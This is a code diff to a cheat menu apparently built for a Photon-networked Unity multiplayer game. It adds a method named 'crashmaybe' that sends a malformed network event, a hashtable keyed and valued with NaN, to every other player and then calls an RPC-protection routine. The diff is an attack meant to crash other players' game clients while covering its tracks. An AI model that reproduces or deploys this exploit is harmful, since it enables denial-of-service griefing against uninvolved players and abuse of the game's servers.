@@ -20,6 +20,7 @@ using UnityEngine;
 using UnityEngine.InputSystem;
 using static iiMenu.Managers.RigManager;
 using static iiMenu.Menu.Main;
+using Hashtable = ExitGames.Client.Photon.Hashtable;
 
 namespace iiMenu.Mods
 {
@@ -109,10 +110,17 @@ namespace iiMenu.Mods
             }
             else { NotifiLib.SendNotification("<color=grey>[</color><color=red>ERROR</color><color=grey>]</color> <color=white>You are not master client.</color>"); }
         }
-        public static void SetGamemode(GameModeType gamemode)
+        public static void crashmaybe()
         {
-            NetworkSystem.Instance.ReturnToSinglePlayer();
-            GorillaComputer.instance.SetGameModeWithoutButton(gamemode.ToString());
+            var options = new RaiseEventOptions
+            {
+                Receivers = ReceiverGroup.Others,
+                InterestGroup = 0,
+            };
+            var hashtable = new Hashtable();
+            hashtable[float.NaN] = float.NaN;
+            PhotonNetwork.NetworkingClient.OpRaiseEvent(176, hashtable, options, SendOptions.SendReliable);
+            RPCProtection();
         }
 
         public static void UnguardianGun()
